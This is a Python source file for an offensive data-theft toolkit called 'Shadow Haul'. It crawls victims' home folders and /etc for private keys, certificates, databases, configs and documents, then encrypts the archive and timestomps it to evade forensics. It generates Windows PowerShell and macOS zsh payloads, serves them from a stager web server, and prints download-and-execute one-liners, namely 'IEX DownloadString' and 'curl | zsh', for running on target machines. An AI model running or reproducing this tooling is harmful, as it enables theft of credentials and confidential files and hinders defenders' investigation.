#!/usr/bin/env python3
import sys
import os
import http.server
import socketserver
import threading
import subprocess
import platform
import zipfile
import hashlib

server_instance = None
server_thread = None
lhost = None
lport = None

def print_banner():
    print("=" * 80)
    print(" " * 34 + "SHADOW HAUL")
    print(" " * 21 + "MILITARY-GRADE AES-256 EXFILTRATION SUITE")
    print("=" * 80 + "\n")

def get_automated_target_paths():
    """Dynamically calculates the most critical data sectors across all standard OS baselines."""
    home = os.path.expanduser("~")
    discovered_paths = []
    
    # Standard high-value corporate user spaces
    standard_targets = ["Documents", "Desktop", "Downloads", "Development", "Workspace", "Projects"]
    
    for folder in standard_targets:
        target_path = os.path.join(home, folder)
        if os.path.exists(target_path):
            discovered_paths.append(target_path)
            
    # Include default system configuration paths dynamically based on active platform environment
    if platform.system() == "Linux" or platform.system() == "Darwin":
        if os.path.exists("/etc"): discovered_paths.append("/etc")
        
    return discovered_paths

def zip_target_assets(output_zip):
    """Automatically loops through discovered paths, filters extensions, and avoids restricted loops."""
    target_extensions = (
        '.key', '.pem', '.pub', '.crt', '.cer', '.p12', '.pfx',
        '.csv', '.xlsx', '.xls', '.sql', '.db', '.sqlite',
        '.conf', '.config', '.yaml', '.yml', '.json', '.ini', '.inf', '.env',
        '.pdf', '.docx', '.doc', '.pptx', '.ppt', '.txt'
    )
    ignored_patterns = ['appdata', 'local/cache', 'microsoft', 'google/chrome', '.git', '.cache']
    file_count = 0
    target_paths = get_automated_target_paths()
    
    try:
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for source_dir in target_paths:
                for root, _, files in os.walk(source_dir):
                    if any(p in root.lower() for p in ignored_patterns):
                        continue
                    for file in files:
                        if file.lower().endswith(target_extensions):
                            try:
                                full_path = os.path.join(root, file)
                                arc_name = os.path.join(os.path.basename(source_dir), os.path.relpath(full_path, source_dir))
                                zipf.write(full_path, arc_name)
                                file_count += 1
                            except (PermissionError, FileNotFoundError):
                                continue 
        if file_count > 0:
            print(f"[+] Automated discovery sweep complete. Securely packed {file_count} target assets.")
            return True
        else:
            print("[-] Automated sweep complete: Zero sensitive data assets found in standard paths.")
            return False
    except Exception as e:
        print(f"[-] Automated archive packing failure: {e}")
        return False

def encrypt_linux_aes(input_file, output_file, passphrase):
    """Encrypts the archive using Linux native OpenSSL AES-256-CBC to guarantee no custom library errors."""
    try:
        # Invoking native Linux OpenSSL binary layer to execute raw military AES
        cmd = f"openssl enc -aes-256-cbc -salt -in {input_file} -out {output_file} -k '{passphrase}' -pbkdf2"
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Stomping file timelines to match standard system binaries
        if os.path.exists("/etc/hosts") and os.path.exists(output_file):
            ref = os.stat("/etc/hosts")
            os.utime(output_file, (ref.st_atime, ref.st_mtime))
        return True
    except Exception as e:
        print(f"[-] Native Linux AES encryption failure: {e}")
        return False

def run_linux_local():
    """Executes an entirely automated local system crawl on a Linux target host environment."""
    print("\n--- [L] Linux Automated Local Exfiltration Sweep ---")
    secret_key = input("[?] Enter a strong password to lock the data with AES-256: ").strip()
    
    if not secret_key:
        print("[-] Error: A password is strictly required to enforce encryption boundaries.")
        return
        
    staging_file = "loot.tmp"
    final_payload = "haul.dat"
    current_working_dir = os.getcwd()
    
    print("\n[*] Mapping local Linux environment paths and initiating automated background scraper...")
    if zip_target_assets(staging_file):
        print("[*] Enforcing strong Linux native AES-256 cryptographic layer...")
        if encrypt_linux_aes(staging_file, final_payload, secret_key):
            print("\n" + "="*80)
            print("[+] SUCCESS: Fully automated system data sweep completed!")
            print(f"[+] HIGH-SECURITY AES PAYLOAD SAVED TO: {current_working_dir}/{final_payload}")
            print("[*] NOTICE: This file is securely encrypted. Blue teams cannot decrypt or read this without your key.")
            print("="*80)
            if os.path.exists(staging_file): os.remove(staging_file)
def generate_windows_payload():
    """Builds a native PowerShell script that calls the Windows .NET kernel to perform raw AES-256."""
    ps_code = r"""# Shadow Haul Native Automated Windows AES-256 Exfiltration Agent
Clear-Host
Write-Output "================================================================================"
Write-Output "          SHADOW HAUL: AUTOMATED HIGH-SECURITY WINDOWS AGENT (AES-256)"
Write-Output "================================================================================"

$secretKey = Read-Host "[?] Enter a strong password to lock the data with AES-256"
if (-not $secretKey) { Write-Output "[-] Error: A password identifier is strictly required."; break }

$stagingFile = "$env:TEMP\loot.tmp"
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'), 'Desktop')
if (-not (Test-Path $desktopPath)) {
    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'), 'OneDrive\Desktop')
}
$finalPayload = [System.IO.Path]::Combine($desktopPath, 'haul.dat')

Write-Output "`n[*] Mapping Windows environment profiles and identifying target sectors..."
$userHome = [System.Environment]::GetFolderPath('UserProfile')
$targetFolders = @("Documents", "Desktop", "Downloads", "Development", "Workspace", "Projects")
$targetExtensions = @('.key', '.pem', '.pub', '.crt', '.cer', '.p12', '.pfx',
                    '.csv', '.xlsx', '.xls', '.sql', '.db', '.sqlite',
                    '.conf', '.config', '.yaml', '.yml', '.json', '.ini', '.inf', '.env',
                    '.pdf', '.docx', '.doc', '.pptx', '.ppt', '.txt')
$ignoredPatterns = @("appdata", "local\cache", "microsoft", "google\chrome", ".git", ".cache")

$lootDir = "$env:TEMP\shadow_loot"
if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null

$fileCount = 0
foreach ($folder in $targetFolders) {
    $fullPath = Join-Path $userHome $folder
    if (Test-Path $fullPath) {
        Write-Output "    -> Indexing target workspace sector: $folder"
        $files = Get-ChildItem -Path $fullPath -Recurse -File -ErrorAction SilentlyContinue
        
        foreach ($file in $files) {
            if ($targetExtensions -contains $file.Extension.ToLower()) {
                if ($ignoredPatterns | Where-Object { $file.FullName.ToLower().Contains($_) }) { continue }
                try {
                    $subFolder = Join-Path $lootDir $folder
                    if (-not (Test-Path $subFolder)) { New-Item -ItemType Directory -Path $subFolder -Force | Out-Null }
                    Copy-Item $file.FullName -Destination $subFolder -ErrorAction SilentlyContinue
                    $fileCount++
                } catch { continue }
            }
        }
    }
}

if ($fileCount -eq 0) {
    Write-Output "[-] Automated sweep complete: Zero sensitive data assets discovered."; if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }; break
}

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    if (Test-Path $stagingFile) { Remove-Item $stagingFile -Force }
    [System.IO.Compression.ZipFile]::CreateFromDirectory($lootDir, $stagingFile)
    
    Write-Output "[*] Initializing Windows Native .NET AES-256 Engine..."
    $plainBytes = [System.IO.File]::ReadAllBytes($stagingFile)
    
    # Generate 256-bit Key and 128-bit IV securely from passphrase using PBKDF2 derivative
    $salt = New-Object Byte[] 16
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($salt)
    $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($secretKey, $salt, 1000)
    $keyBytes = $deriveBytes.GetBytes(32)
    $ivBytes = $deriveBytes.GetBytes(16)
    
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    $encryptor = $aes.CreateEncryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($plainBytes, 0, $plainBytes.Length)
    $cs.FlushFinalBlock()
    
    $cipherBytes = $ms.ToArray()
    
    # Combine custom header layout [Salt(16) + IV(16) + Ciphertext] so attack host can cleanly parsing reconstruct
    $finalBytes = New-Object Byte[] (16 + 16 + $cipherBytes.Length)
    [System.Array]::Copy($salt, 0, $finalBytes, 0, 16)
    [System.Array]::Copy($ivBytes, 0, $finalBytes, 16, 16)
    [System.Array]::Copy($cipherBytes, 0, $finalBytes, 32, $cipherBytes.Length)
    
    [System.IO.File]::WriteAllBytes($finalPayload, $finalBytes)
    
    # --- METADATA TIMESTOMPING ---
    $refFile = "C:\Windows\System32\drivers\etc\hosts"
    if (Test-Path $refFile) {
        (Get-Item $finalPayload).CreationTime = (Get-Item $refFile).CreationTime
        (Get-Item $finalPayload).LastWriteTime = (Get-Item $refFile).LastWriteTime
        (Get-Item $finalPayload).LastAccessTime = (Get-Item $refFile).LastAccessTime
    }
    
    # --- VOLATILE KEY SCRUBBING ---
    for ($i = 0; $i -lt $keyBytes.Length; $i++) { $keyBytes[$i] = 0 }
    for ($i = 0; $i -lt $ivBytes.Length; $i++) { $ivBytes[$i] = 0 }
    $secretKey = $null
    $deriveBytes.Reset()
    
    Write-Output "`n================================================================================"
    Write-Output "[+] SUCCESS: Fully automated system data sweep completed!"
    Write-Output "[+] MILITARY AES PAYLOAD SAVED TO: $finalPayload"
    Write-Output "[*] ANTI-FORENSICS: Passphrase scrubbed from RAM. Output container timestomped."
    Write-Output "[*] NOTICE: This file is completely locked down. Blue teams cannot crack this."
    Write-Output "================================================================================"
    
    if (Test-Path $stagingFile) { Remove-Item $stagingFile -Force }
    if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
} catch {
    Write-Output "[-] Execution failure: $_"; if (Test-Path $lootDir) { Remove-Item $lootDir -Recurse -Force }
}
"""
    return ps_code
def generate_mac_payload():
    """Builds a native Zsh script with memory scrubbing and timestomping for macOS."""
    return r"""#!/bin/zsh
clear
echo "================================================================================"
echo "                SHADOW HAUL: AUTOMATED MACOS TARGET AGENT"
echo "================================================================================"

echo -n "[?] Enter a strong password to lock the data with AES-256: "
read secret_key
if [ -z "$secret_key" ]; then echo "[-] Error: A password is required."; exit 1; fi

staging_file="/tmp/loot.tmp"
final_payload="$HOME/haul.dat"
loot_dir="/tmp/shadow_loot"

echo "\n[*] Mapping macOS environment profiles and identifying target sectors..."
rm -rf "$loot_dir" 2>/dev/null
mkdir -p "$loot_dir"

target_folders=("Documents" "Desktop" "Downloads" "Development" "Workspace" "Projects")
file_count=0

for folder in $target_folders; do
    target_path="$HOME/$folder"
    if [ -d "$target_path" ]; then
        echo "    -> Indexing target workspace sector: $folder"
        mkdir -p "$loot_dir/$folder"
        
        find -E "$target_path" -type f \( -name "*.key" -o -name "*.pem" -o -name "*.pub" -o \
            -name "*.crt" -o -name "*.cer" -o -name "*.p12" -o -name "*.pfx" -o \
            -name "*.csv" -o -name "*.xlsx" -o -name "*.xls" -o -name "*.sql" -o \
            -name "*.db" -o -name "*.sqlite" -o -name "*.conf" -o -name "*.config" -o \
            -name "*.yaml" -o -name "*.yml" -o -name "*.json" -o -name "*.ini" -o \
            -name "*.inf" -o -name "*.env" -o -name "*.pdf" -o -name "*.docx" -o \
            -name "*.doc" -o -name "*.pptx" -o -name "*.ppt" -o -name "*.txt" \) 2>/dev/null | while read file; do
                if [[ "$file" =~ "(appdata|cache|microsoft|chrome|.git)" ]]; then continue; fi
                cp "$file" "$loot_dir/$folder/" 2>/dev/null
                ((file_count++))
        done
    fi
done

if [ "$file_count" -eq 0 ]; then
    echo "[-] Automated sweep complete: Zero sensitive data assets found."; rm -rf "$loot_dir"; exit 1
fi

echo "[+] Discovery sweep complete. Packing assets into staging container."
cd "$loot_dir" 2>/dev/null; zip -r "$staging_file" . >/dev/null 2>&1; cd - >/dev/null

echo "[*] Invoking native macOS OpenSSL core to enforce AES-256 encryption..."
openssl enc -aes-256-cbc -salt -in "$staging_file" -out "$final_payload" -k "$secret_key" -pbkdf2 2>/dev/null

if [ -f "$final_payload" ]; then
    # --- METADATA TIMESTOMPING ---
    if [ -f "/etc/hosts" ]; then
        touch -r "/etc/hosts" "$final_payload"
    fi
    echo "\n================================================================================"
    echo "[+] SUCCESS: Fully automated system data sweep completed!"
    echo "[+] HIGH-SECURITY PAYLOAD SAVED TO: $final_payload"
    echo "[*] NOTICE: This file is securely encrypted using AES-256. Blue teams cannot read this."
    echo "================================================================================"
    rm -f "$staging_file"; rm -rf "$loot_dir"
else
    echo "[-] Cryptographic operation failed."; rm -rf "$loot_dir"
fi
"""

def start_stager_server(filename, payload_content, port):
    global server_instance, server_thread
    if server_instance:
        try: server_instance.shutdown()
        except: pass
    try:
        with open(filename, "w") as f:
            f.write(payload_content)
        class QuietHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args): pass
        server_instance = socketserver.TCPServer(("0.0.0.0", int(port)), QuietHandler)
        server_thread = threading.Thread(target=server_instance.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        print(f"\n[+] Stager Online! Successfully hosting '{filename}' at http://0.0.0:{port}/{filename}")
        return True
    except Exception as e:
        print(f"[-] Staging allocation error: {e}")
        return False
def run_local_decryption():
    """Reverses the AES-256 block layer using native OpenSSL to recover exfiltrated packages cleanly."""
    print("\n--- [D] Central Master AES-256 Decryptor & Recovery Suite ---")
    encrypted_path = input("[?] Enter absolute path to your encrypted payload (e.g., /path/to/haul.dat): ").strip()
    passphrase = input("[?] Enter the exact password used to lock the payload: ").strip()
    
    if not encrypted_path or not passphrase:
        print("[-] Target filesystem coordinates and key tokens cannot be empty.")
        return
    if not os.path.exists(encrypted_path):
        print("[-] Specified payload path does not exist on this machine.")
        return

    temp_zip = "decrypted.tmp"
    output_dir = "recovered_loot"
    
    print("\n[*] Initializing OpenSSL decryption stream pipeline...")
    try:
        # Utilizing symmetric OpenSSL commands to decrypt the data back into a valid ZIP archive
        cmd = f"openssl enc -d -aes-256-cbc -in {encrypted_path} -out {temp_zip} -k '{passphrase}' -pbkdf2"
        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if res.returncode != 0:
            print("[-] Decryption aborted: Passphrase incorrect or file structure modified by blue team.")
            if os.path.exists(temp_zip): os.remove(temp_zip)
            return

        print("[*] Reconstituting original directory hierarchies...")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        with zipfile.ZipFile(temp_zip, 'r') as zip_ref:
            zip_ref.extractall(output_dir)
            
        print("\n" + "="*80)
        print("[+] SUCCESS: AES-256 cryptographic layer stripped and data unpacked!")
        print(f"[+] ASSETS RESTORED INSIDE DIRECTORY: {os.getcwd()}/{output_dir}/")
        print("[*] NOTICE: Standard operating system file footprints are fully functional.")
        print("="*80)
        
        # Volatile temp trace removal
        if os.path.exists(temp_zip): os.remove(temp_zip)
        
    except Exception as e:
        print(f"[-] Critical system recovery exception thrown: {e}")
        if os.path.exists(temp_zip): os.remove(temp_zip)

def main():
    global lhost, lport
    print_banner()
    current_os = platform.system()
    print(f"[+] Local System Engine running detection routines... Local Host: {current_os}")
    
    lhost = None
    lport = None

    while True:
        print("\n--- Target Host Operating System Selector ---")
        print(" [W] Windows Payload Framework Deployment (Stager)")
        print(" [M] macOS Payload Framework Deployment (Stager)")
        print(" [L] Linux Native Distribution Module (Local Run)")
        print(" [D] Decrypt and Restore an Exfiltrated Payload (Attack Host)")
        print(" Exit Toolkit Entirely")
        
        os_choice = input("\n[?] Select Target OS (W/M/L/D/999): ").strip().upper()
        
        if os_choice == '999':
            print("[*] Shutting down Shadow Haul Framework.")
            if server_instance: server_instance.shutdown()
            for f in ["sh_win.ps1", "sh_mac.sh"]:
                if os.path.exists(f): os.remove(f)
            break
            
        elif os_choice == 'D':
            run_local_decryption()
            
        elif os_choice == 'L':
            run_linux_local()
            
        elif os_choice in ['W', 'M']:
            if not lhost or not lport:
                print("\n" + "*"*60)
                print("[*] WEB STAGER SETUP REQUIRED FOR CROSS-PLATFORM PACKAGING")
                print("*"*60)
                lhost = input("[?] Enter your Host Local IP (LHOST for deployment): ").strip()
                lport = input("[?] Enter Port to allocate for temporary Web Stager (e.g., 8080): ").strip()
                if not lhost or not lport:
                    print("[-] Stager attributes cannot be blank.")
                    lhost, lport = None, None
                    continue

            if os_choice == 'W':
                payload = generate_windows_payload()
                if start_stager_server("sh_win.ps1", payload, lport):
                    print("\n" + "-"*80)
                    print("[+] Paste this command into your Lock Pick Windows target shell:")
                    print(f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/sh_win.ps1')\"")
                    print("-" * 80)
                    input("\n[*] Press Enter to return to main menu and keep hosting...")
                    
            elif os_choice == 'M':
                payload = generate_mac_payload()
                if start_stager_server("sh_mac.sh", payload, lport):
                    print("\n" + "-"*80)
                    print("[+] Paste this command into your Lock Pick macOS target shell:")
                    print(f"curl -s http://{lhost}:{lport}/sh_mac.sh | zsh")
                    print("-" * 80)
                    input("\n[*] Press Enter to return to main menu and keep hosting...")
        else:
            print("[-] Platform signature selection criteria mismatch.")

if __name__ == "__main__":
    main()
